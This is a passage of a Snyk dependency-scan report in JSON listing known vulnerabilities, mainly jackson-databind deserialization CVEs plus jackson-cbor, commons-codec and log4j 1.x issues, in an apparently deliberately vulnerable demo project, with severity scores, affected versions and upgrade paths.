Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2097)\n",
      "disclosureTime": "2018-07-27T17:24:46Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.7"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72451",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-9mxf-g3x6-wv74"
        ],
        "CVE": [
          "CVE-2018-14721"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:09:14.989820Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:24:39Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2097"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.7)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-01-03T14:17:19.256477Z",
      "credit": [
        "Wuguixiong"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attacks due to not blocking the `jboss-common-core ` class from polymorphic deserialization.\r\n\r\n**Note** This vulnerability (`CVE-2018-19362`) is not identical to `CVE-2018-19360` and `CVE-2018-19361`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.8 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2186)\n- [GitHub Release Tag](https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8)\n",
      "disclosureTime": "2019-01-02T19:18:44Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72882",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-c8hm-7hpq-7jhg"
        ],
        "CVE": [
          "CVE-2018-19362"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:09:16.312672Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-03T17:01:51Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2186"
        },
        {
          "title": "GitHub Release Tag",
          "url": "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-01-03T14:17:23.673097Z",
      "credit": [
        "Wuguixiong"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attacks due to not blocking the `axis2-transport-jms ` class from polymorphic deserialization.\r\n\r\n**Note** This vulnerability (`CVE-2018-19360`) is not identical to `CVE-2018-19362` and `CVE-2018-19361`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.8 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2186)\n- [GitHub Release Tag](https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8)\n",
      "disclosureTime": "2019-01-02T19:18:44Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72883",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-f9hv-mg5h-xcw9"
        ],
        "CVE": [
          "CVE-2018-19360"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:09:14.647729Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-03T17:01:51Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2186"
        },
        {
          "title": "GitHub Release Tag",
          "url": "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-01-03T14:17:31.715185Z",
      "credit": [
        "Wuguixiong"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attacks due to not blocking the `axis2-transport-jms ` class from polymorphic deserialization.\r\n\r\n**Note** This vulnerability (`CVE-2018-19361`) is not identical to `CVE-2018-19362` and `CVE-2018-19360`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.8 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2186)\n- [GitHub Release Tag](https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8)\n",
      "disclosureTime": "2019-01-02T19:18:43Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72884",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-mx9v-gmh4-mgqw"
        ],
        "CVE": [
          "CVE-2018-19361"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:09:13.761438Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-03T17:01:51Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2186"
        },
        {
          "title": "GitHub Release Tag",
          "url": "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2020-11-29T16:20:27.460059Z",
      "credit": [
        "cowtowncoder"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). Unchecked allocation of byte buffer can cause a `java.lang.OutOfMemoryError` exception.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.fasterxml.jackson.dataformat:jackson-dataformat-cbor` to version 2.11.4, 2.12.1 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-dataformats-binary/commit/de072d314af8f5f269c8abec6930652af67bc8e6)\n- [GitHub Issue](https://github.com/FasterXML/jackson-dataformats-binary/issues/186)\n",
      "disclosureTime": "2021-01-26T12:07:29Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/dataformat/cbor/CBORParser.java",
            "className": "CBORParser",
            "functionName": "_finishBytes"
          },
          "version": [
            "[2.12.0-rc1,2.12.1)"
          ]
        },
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/dataformat/cbor/CBORParser.java",
            "className": "CBORParser",
            "functionName": "_finishBytes"
          },
          "version": [
            "[,2.11.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.11.4",
        "2.12.1"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONDATAFORMAT-1047329",
      "identifiers": {
        "CWE": [
          "CWE-400"
        ],
        "CVE": [
          "CVE-2020-28491"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-02-01T11:57:18.683195Z",
      "moduleName": "com.fasterxml.jackson.dataformat:jackson-dataformat-cbor",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.dataformat:jackson-dataformat-cbor",
      "patches": [],
      "proprietary": true,
      "publicationTime": "2021-01-26T16:10:11Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-dataformats-binary/commit/de072d314af8f5f269c8abec6930652af67bc8e6"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-dataformats-binary/issues/186"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.dataformat.cbor.CBORParser",
            "functionName": "_finishBytes"
          },
          "version": [
            "[2.12.0-rc1,2.12.1)"
          ]
        },
        {
          "functionId": {
            "className": "com.fasterxml.jackson.dataformat.cbor.CBORParser",
            "functionName": "_finishBytes"
          },
          "version": [
            "[,2.11.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,2.11.4)",
          "[2.12.0-rc1,2.12.1)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.dataformat",
        "artifactId": "jackson-dataformat-cbor"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.amazonaws:aws-java-sdk-dynamodb@1.11.34",
        "com.amazonaws:aws-java-sdk-core@1.11.34",
        "com.fasterxml.jackson.dataformat:jackson-dataformat-cbor@2.9.5"
      ],
      "upgradePath": [
        false,
        "com.amazonaws:aws-java-sdk-dynamodb@1.12.213",
        "com.amazonaws:aws-java-sdk-core@1.12.213",
        "com.fasterxml.jackson.dataformat:jackson-dataformat-cbor@2.12.6"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.dataformat:jackson-dataformat-cbor",
      "version": "2.9.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2020-03-30T17:22:24.164713Z",
      "credit": [
        "Hanson Char"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n[commons-codec:commons-codec](https://commons.apache.org/proper/commons-codec) is a package that contains simple encoder and decoders for various formats such as Base64 and Hexadecimal.\n\nAffected versions of this package are vulnerable to Information Exposure. When there is no byte array value that can be encoded into a string the Base32 implementation does not reject it, and instead decodes it into an arbitrary value which can be re-encoded again using the same implementation. This allows for information exposure exploits such as tunneling additional information via seemingly valid base 32 strings.\n## Remediation\nUpgrade `commons-codec:commons-codec` to version 1.13 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113)\n- [Jira Issue](https://issues.apache.org/jira/browse/CODEC-134)\n",
      "disclosureTime": "2020-03-30T17:20:23Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "org/apache/commons/codec/binary/Base64.java",
            "className": "Base64",
            "functionName": "decode"
          },
          "version": [
            "[,1.13)"
          ]
        },
        {
          "functionId": {
            "filePath": "org/apache/commons/codec/binary/Base32.java",
            "className": "Base32",
            "functionName": "decode"
          },
          "version": [
            "[1.5,1.13)"
          ]
        }
      ],
      "fixedIn": [
        "1.13"
      ],
      "id": "SNYK-JAVA-COMMONSCODEC-561518",
      "identifiers": {
        "CWE": [
          "CWE-200"
        ],
        "CVE": []
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-06-12T14:37:04.472432Z",
      "moduleName": "commons-codec:commons-codec",
      "packageManager": "maven",
      "packageName": "commons-codec:commons-codec",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2012-03-03T17:20:25Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113"
        },
        {
          "title": "Jira Issue",
          "url": "https://issues.apache.org/jira/browse/CODEC-134"
        }
      ],
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.commons.codec.binary.Base64",
            "functionName": "decode"
          },
          "version": [
            "[,1.13)"
          ]
        },
        {
          "functionId": {
            "className": "org.apache.commons.codec.binary.Base32",
            "functionName": "decode"
          },
          "version": [
            "[1.5,1.13)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.13)"
        ]
      },
      "mavenModuleName": {
        "groupId": "commons-codec",
        "artifactId": "commons-codec"
      },
      "severityWithCritical": "low",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.amazonaws:aws-java-sdk-dynamodb@1.11.34",
        "com.amazonaws:aws-java-sdk-core@1.11.34",
        "org.apache.httpcomponents:httpclient@4.5.5",
        "commons-codec:commons-codec@1.11"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "commons-codec:commons-codec",
      "version": "1.11"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2021-06-04T15:38:41.700520Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9)\n",
      "disclosureTime": "2020-04-27T17:16:14Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [],
      "id": "SNYK-JAVA-LOG4J-1300176",
      "identifiers": {
        "CWE": [
          "CWE-297"
        ],
        "GHSA": [
          "GHSA-vwqq-5vrc-xw9h"
        ],
        "CVE": [
          "CVE-2020-9488"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-03-27T14:22:09.168396Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-04-28T17:16:14Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b"
        },
        {
          "title": "Jira Issue",
          "url": "https://issues.apache.org/jira/browse/LOG4J2-2819"
        },
        {
          "title": "Reload4j Fix Commit",
          "url": "https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9"
        }
      ],
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Man-in-the-Middle (MitM)",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "severityWithCritical": "low",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.amazonaws:aws-lambda-java-log4j@1.0.0",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-12-13T14:52:40.887231Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.6,
